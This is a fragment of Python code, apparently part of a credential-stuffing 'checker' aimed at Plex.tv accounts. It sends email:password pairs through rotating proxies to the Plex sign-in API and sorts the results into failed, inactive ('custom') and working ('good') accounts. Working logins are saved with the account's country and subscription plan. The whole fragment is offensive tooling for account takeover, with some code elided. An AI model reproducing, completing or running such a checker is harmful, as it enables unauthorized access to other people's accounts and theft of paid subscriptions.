    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                response = s.post(
                    f"https://plex.tv/api/v2/users/signin?X-Plex-Product=Plex%20Web&X-Plex-Version=4.71.0&X-Plex-Client-Identifier={guid}",
                    data=data,
                    headers=headers,
                )
                if (
                    '{"errors":' in response.text
                    or '"status":401}]}' in response.text
                    or '"User could not be authenticated",' in response.text
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                    ...
                    '{"id":' in response.text
                    or ',"uuid":"' in response.text
                    or ',"thumb":"' in response.text
                    or '":{"active":' in response.text
                ):
                    data = response.json()
                    ...
                    if not active:
                        ...
                        return_proxy(proxy)
                        if not Checker.cui:
                            log("custom", ":".join([email, password]), "Plextv")
                        save(
                            "Plextv",
                            "custom",
                            Checker.time,
                    ...
                    return_proxy(proxy)
                    if not Checker.cui:
                        log("good", ":".join([email, password]), "Plextv")
                    save(
                        "Plextv",
                        "good",
                        Checker.time,
                        ":".join([email, password])
                        + f" | Country: {country} | Plan: {subscription}",
                    )
                    return
                else:
                    raise
